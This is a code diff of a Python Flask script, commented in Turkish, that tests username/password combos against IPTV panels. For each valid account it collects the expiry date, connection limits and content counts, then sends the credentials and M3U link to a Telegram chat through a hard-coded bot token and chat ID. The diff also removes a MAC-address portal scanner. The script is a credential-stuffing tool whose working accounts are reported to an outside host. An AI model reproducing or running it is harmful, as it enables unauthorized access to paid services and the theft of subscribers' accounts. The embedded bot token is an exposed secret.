@@ -1,5 +1,6 @@
 import os
 import time
+import datetime
 import requests
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
@@ -13,7 +14,7 @@ app = Flask('')
 def home():
     return "IPTV Bot Aktif ve 7/24 Bulutta Çalışıyor!"
 
-# --- TELEGRAM AYARLARI (GÜNCELLENDİ) ---
+# --- TELEGRAM AYARLARI ---
 TOKEN = "9296501081:AAG8COydawvxX-TfAEArbG-SdEtliP6WODM"
 CHAT_ID = "-1003901042500"
 
@@ -28,68 +29,110 @@ def telegrama_gonder(mesaj):
     except Exception as e:
         print(f"[!] Telegram mesajı gönderilemedi (Kritik Hata): {e}")
 
-def m3u_tara(panel, user, pas):
+HEADERd = {
+    'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
+    'X-User-Agent': 'Model: MAG322; Link: Ethernet,WiFi',
+    'Accept': '*/*',
+    'Connection': 'Keep-Alive',
+    'Accept-Encoding': 'gzip',
+    'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
+}
+
+def m3u_tara_detayli(panel, user, pas):
     api_url = f"http://{panel}/player_api.php?username={user}&password={pas}"
-    headers = {
-        'Cookie': 'stb_lang=pt; timezone=America%2FNew_York;',
-        'User-Agent': 'VLC/3.0.18 LibVLC/3.0.18',
-    }
     try:
-        res = requests.get(api_url, headers=headers, timeout=5, verify=False)
+        res = requests.get(api_url, headers=HEADERd, timeout=5, verify=False)
         if res.status_code == 200 and 'user_info' in res.text:
-            if '"auth":1' in res.text or '"status":"Active"' in res.text:
+            veri = str(res.text)
+            if '"auth":1' in veri or '"status":"Active"' in veri:
+                
+                # Detayları Çözümleme (Attığın betikten esinlenerek)
+                try:
+                    status = veri.split('status":')[1].split(',')[0].replace('"', '')
+                except:
+                    status = "Active"
+                
+                try:
+                    acon = veri.split('active_cons":')[1].split(',')[0].replace('"', '')
+                except:
+                    acon = "?"
+                
+                try:
+                    mcon = veri.split('max_connections":')[1].split(',')[0].replace('"', '')
+                except:
+                    mcon = "?"
+                
+                try:
+                    bitis = veri.split('exp_date":')[1].split(',')[0].replace('"', '')
+                    if bitis == 'null' or not bitis.isdigit():
+                        bitis = 'Sınırsız'
+                    else:
+                        bitis = datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S')
+                except:
+                    bitis = 'Bilinmiyor'
+
+                try:
+                    realm = veri.split('url":')[1].split(',')[0].replace('"', '')
+                    port = veri.split('port":')[1].split(',')[0].replace('"', '')
+                except:
+                    realm, port = panel, "80"
+
+                # İçerik Sayıları (Kanal, Film, Dizi)
+                kanalsayisi, filmsayisi, dizisayisi = "0", "0", "0"
+                try:
+                    k_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_live_streams", timeout=3, verify=False)
+                    kanalsayisi = str(k_res.text.count('stream_id'))
+                    
+                    v_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_vod_streams", timeout=3, verify=False)
+                    filmsayisi = str(v_res.text.count('stream_id'))
+                    
+                    s_res = requests.get(f"http://{panel}/player_api.php?username={user}&password={pas}&action=get_series", timeout=3, verify=False)
+                    dizisayisi = str(s_res.text.count('series_id'))
+                except:
+                    pass
+
                 m3ulink = f"http://{panel}/get.php?username={user}&password={pas}&type=m3u_plus"
+                
+                # Şık Telegram Mesajı
                 mesaj = (
-                    f"🟢 <b>M3U HİT BULUNDU! (Bulut)</b>\n"
-                    f"🌐 <b>Panel:</b> http://{panel}\n"
-                    f"👤 <b>User:</b> <code>{user}</code>\n"
-                    f"🔑 <b>Pass:</b> <code>{pas}</code>\n"
-                    f"🔗 <b>M3U:</b> {m3ulink}"
+                    f"🟢 <b>IPTV HİT BULUNDU! (Bulut Otonom)</b>\n"
+                    f"🌐 <b>Ana Host:</b> http://{panel}\n"
+                    f"🔗 <b>Real Host:</b> http://{realm}:{port}\n"
+                    f"👤 <b>Kullanıcı:</b> <code>{user}</code>\n"
+                    f"🔑 <b>Şifre:</b> <code>{pas}</code>\n"
+                    f"📅 <b>Bitiş Tarihi:</b> {bitis}\n"
+                    f"⚡ <b>Aktif/Max Bağlantı:</b> {acon} / {mcon}\n"
+                    f"📊 <b>Durum:</b> {status}\n"
+                    f"🎬 <b>Kanal:</b> {kanalsayisi} | <b>Film:</b> {filmsayisi} | <b>Dizi:</b> {dizisayisi}\n"
+                    f"🔗 <b>M3U Plus Link:</b> {m3ulink}"
                 )
+                
                 telegrama_gonder(mesaj)
                 return True
     except:
         pass
     return False
 
-def mac_tara(panel, mac):
-    mac_url = f"http://{panel}/c/portal.imixs.com/stalker_portal/server/load.php?type=stb&action=handshake&mac={mac}"
-    headers = {'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3'}
-    try:
-        res = requests.get(mac_url, headers=headers, timeout=5, verify=False)
-        if res.status_code == 200 and ('js' in res.text or 'token' in res.text):
-            mesaj = (
-                f"🟢 <b>MAC HİT BULUNDU! (Bulut)</b>\n"
-                f"🌐 <b>Panel:</b> http://{panel}\n"
-                f"📺 <b>MAC:</b> <code>{mac}</code>"
-            )
-            telegrama_gonder(mesaj)
-            return True
-    except:
-        pass
-    return False
-
 def arka_plan_tarayici():
     print("[*] Bulut Otonom Tarayıcı Başlatıldı...")
-    time.sleep(3) # Sistem kendine gelsin diye minik bekleme
+    time.sleep(3)
     
     # Başlangıç bildirimi
-    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Başlatıldı ve Aktif!</b>\n⏳ Tarama döngüsü devrede.")
+    telegrama_gonder("🚀 <b>Bulut Otonom Tarayıcı Gelişmiş Mod ile Başlatıldı ve Aktif!</b>\n⏳ Tarama döngüsü devrede.")
         
     paneller = ["ornekpanel.com:8080"] 
     combos = []
-    maclar = []
     
     while True:
         try:
             print("[i] Tarama turu dönüyor...")
+            # Buraya kendi combo ve panel döngülerini ekleyebilirsin
             time.sleep(1800) # 30 dk bekleme
         except Exception as e:
             print(f"[!] Hata: {e}")
             time.sleep(60)
 
 if __name__ == '__main__':
-    # Önce tarayıcıyı ayrı bir thread'de başlatıyoruz ki Flask'ı bloklamasın
     import threading
     t = threading.Thread(target=arka_plan_tarayici)
     t.daemon = True
